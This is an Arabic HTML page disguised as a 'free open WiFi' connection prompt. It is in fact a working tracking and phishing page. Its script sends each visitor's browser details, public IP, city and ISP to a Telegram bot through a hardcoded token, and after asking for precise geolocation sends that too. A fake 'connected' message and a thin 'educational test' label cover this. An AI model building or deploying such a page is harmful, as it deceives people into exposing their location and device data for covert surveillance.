<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>📶 شبكة قريبة منك</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, Arial, sans-serif; background: linear-gradient(160deg, #0f0c29, #302b63); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
.box { background: rgba(20, 25, 50, 0.9); padding: 30px 25px; border-radius: 24px; max-width: 440px; width: 100%; border: 1px solid rgba(255,255,255,0.08); }
.header { text-align: center; margin-bottom: 20px; }
.icon { width: 70px; height: 70px; margin: 0 auto 15px; background: linear-gradient(135deg, #4da6ff, #9d4edd); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; }
h1 { font-size: 22px; margin-bottom: 8px; background: linear-gradient(90deg, #4da6ff, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
p { font-size: 13px; color: #8892b0; }
.networks { background: rgba(10, 15, 35, 0.7); border-radius: 16px; padding: 15px; margin-bottom: 20px; }
.net { display: flex; align-items: center; justify-content: space-between; padding: 14px; background: rgba(26, 32, 64, 0.8); border-radius: 12px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.05); }
.net.open { border-color: #4dff88; }
.net .info { flex: 1; text-align: right; }
.net .name { font-size: 15px; font-weight: bold; }
.net .meta { font-size: 11px; color: #8892b0; }
.net .icons { display: flex; gap: 8px; font-size: 18px; }
button { background: linear-gradient(135deg, #4da6ff, #9d4edd); color: #fff; border: none; padding: 17px; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; }
button:disabled { opacity: 0.7; }
.status { margin-top: 15px; font-size: 13px; text-align: center; color: #8892b0; }
.warn { background: rgba(255,77,77,0.1); border-radius: 10px; padding: 10px; font-size: 11px; color: #ff9999; margin: 15px 0; text-align: center; }
.badge { position: fixed; bottom: 5px; left: 5px; font-size: 9px; color: #555; }
</style>
</head>
<body>
<div class="badge">اختبار تعليمي</div>

<div class="box">
    <div class="header">
        <div class="icon">📶</div>
        <h1>شبكة قريبة منك</h1>
        <p>تم اكتشاف شبكة مفتوحة</p>
    </div>

    <div class="networks">
        <div class="net open">
            <div class="icons"><span>📶</span><span>🔓</span></div>
            <div class="info">
                <div class="name">FREE_WIFI_5G</div>
                <div class="meta">شبكة مفتوحة • قوية</div>
            </div>
        </div>
        <div class="net">
            <div class="icons"><span>📶</span><span>🔒</span></div>
            <div class="info">
                <div class="name">Cafe_Guest</div>
                <div class="meta">محمية</div>
            </div>
        </div>
    </div>

    <button id="btn" onclick="start()">🔓 اتصل بالشبكة</button>
    <div class="status" id="status"></div>

    <div class="warn">⚠️ كل من يستخدم هذه الأداة لاختراق أي شبكة لا تخصه، مصمم الأداة غير مسؤول عن سوء الاستخدام.</div>
</div>

<script>
const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
const CHAT_ID = "7560932400";

function send(t) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: CHAT_ID, text: t})
    }).catch(()=>{});
}

async function start() {
    const btn = document.getElementById("btn");
    const status = document.getElementById("status");
    btn.disabled = true;
    btn.innerText = "🔄 جاري...";

    let info = {
        "النوع": "شبكة واي فاي",
        "المتصفح": navigator.userAgent,
        "نظام التشغيل": navigator.platform,
        "اللغة": navigator.language,
        "دقة الشاشة": screen.width + "x" + screen.height,
        "الوقت": new Date().toLocaleString("ar-EG")
    };

    try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        info["IP العام"] = j.ip;
        info["الدولة"] = j.country;
        info["المدينة"] = j.city;
        info["مزود الخدمة"] = j.connection && j.connection.isp;
    } catch(e) { info["IP العام"] = "غير معروف"; }

    info["الموقع"] = await new Promise(r => {
        if (!navigator.geolocation) return r("غير مدعوم");
        navigator.geolocation.getCurrentPosition(
            p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
            () => r("مرفوض"),
            {enableHighAccuracy: true, timeout: 8000}
        );
    });

    let text = "📶 *معلومات شبكة واي فاي:*\n\n" + Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
    send(text);

    status.innerText = "✅ تم الاتصال";
    btn.innerText = "✓ متصل";
}
</script>
</body>
</html>
